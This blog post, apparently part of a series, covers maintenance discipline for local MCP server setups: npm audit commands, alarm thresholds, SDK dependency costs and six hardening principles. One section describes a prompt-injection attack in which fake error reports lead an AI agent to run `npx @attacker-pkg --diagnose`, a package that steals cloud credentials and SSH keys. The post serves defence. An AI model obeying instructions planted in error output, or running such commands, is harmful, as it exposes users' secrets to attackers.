---
title: Oh My MCP PART 3: The Discipline
description: The migration fixed everything. Then it started drifting back. Governance, security, and the six principles that keep a local-first system clean.
tags: [mcp, security, devops, bestpractices]
---
The migration was a success. Every server was pinned, local, and running without wrappers. The VM breathed again.

Then, three weeks later, I found an `npx -y` in the config.

Someone (me) had added a new server. Quick test. "I'll fix it later." And `npx -y @pkg@latest` was back — the same pattern that caused the crawl in the first place.

Maintenance is forever. The fix isn't one afternoon. It's a discipline.

## The Governance Routine

Five minutes a month keeps the drift at bay:

```bash
cd ~/mcp-servers
npm outdated                 # check what's stale
npm ls @modelcontextprotocol/sdk  # verify SDK stayed lean
du -sh ~/.npm/_npx/          # should be 0 after migration
```

Three commands that answer: is the system still clean?

The alarm thresholds are simple:

| Metric | Green | Red |
|--------|-------|-----|
| Process count | < 20 | > 30 |
| Memory | < 1GB | > 2GB |
| Load (idle) | < 2.0 | > 5.0 |
| npx cache | 0MB | > 50MB |
| SDK version | v0.4.0 - v1.4.x | v1.21.0+ |

If any metric hits red, you investigate. Not tomorrow. Now. Because the gap between "it works" and "the VM crawls" is filled with silent drift.

## The Threat You Didn't See Coming

The migration eliminated the `npx -y` wrapper, but the deeper lesson is about trust.

In June 2026, researchers demonstrated a technique called **Agentjacking**: they injected malicious `npx` commands into fabricated error reports with an 85% success rate. The AI agent read the fake error, executed the recommended fix — `npx @attacker-pkg --diagnose` — and the attacker's package exfiltrated AWS credentials, git SSH keys, and VPN tokens.

The attack vector wasn't a zero-day. It was the `-y` flag.

```
npm registry               ← if compromised or package hijacked
  ↓
npx -y @pkg@latest         ← downloads fresh copy every time
  ↓
sh -c "server"             ← shell injection point
  ↓
node server                ← full agent privileges
  |--- filesystem read/write
  |--- network exfiltration
  |--- env dump (GITHUB_TOKEN, API keys)
```

Local installs with pinned versions eliminate the entire remote attack surface. The package is installed once, verified, and never re-downloaded. The lockfile becomes a security document.

## Your Deps Are Your User's Tax

This principle extends to anyone publishing MCP servers. Every dependency you add is forced onto every consumer.

| SDK version | Consumer pays |
|-------------|--------------|
| v0.4.0 | 71 files, 3 deps |
| v1.29.0 | 677 files, 17 deps |

If your server only uses stdio transport, depending on SDK v0.4.0 costs your users 71 files. Depending on v1.29.0 costs them 677 — a 10x tax for features they don't use.

The responsible choice: **v0.4.0 by default.** Upgrade the SDK only if you specifically need SSE, OAuth, or JSON Schema validation. And call it out in your release notes when you do.

## The Six Principles

The investigation distilled into six rules. They're not optional:

1. **Local-first by default.** stdio only. No HTTP, no SSE, no network for daily tools.
2. **Pin everything.** `--save-exact` or don't ship it. `latest` is a vulnerability.
3. **Remove wrappers.** Direct `node` path, not `npx -y`. Raw bytes, not JSON-RPC framing.
4. **One node_modules.** Shared dependency cache, not per-server isolation.
5. **Govern monthly.** Health check, `npm outdated`, process count baseline.
6. **Build lean.** If you publish, your deps are your user's tax.

These are boring rules. That's the point. The bloat didn't come from a single bad decision — it came from the slow accumulation of "this is fine, it's just one more dependency." Boring rules prevent boring decay.

## The Closing

Ten documents. Four days of investigation. One root cause, repeated six times.

**Every wrapper is a failure mode.** The `sh -c` wrapper that spawns the server. The `npm exec` wrapper that resolves the package. The SDK wrapper that bundles Express and Hono for a stdio-only tool. The JSON-RPC wrapper that serializes every file write. The `latest` tag wrapper that silently upgrades your dependencies.

The fix isn't clever. It's removing layers until only the essential ones remain. Local installs. Pinned versions. Direct node paths. Raw stdio.

The VM is quiet now. The load average stays under 2.0. The editor doesn't stutter.

But I still check `ps aux` every morning.

---

*This is PART 3 of the Oh My MCP trilogy. PART 1 covered the discovery of 45 server processes and SDK bloat. PART 2 covered the migration to local-first architecture. The full reference series (10 documents) lives at the CTO reference library.*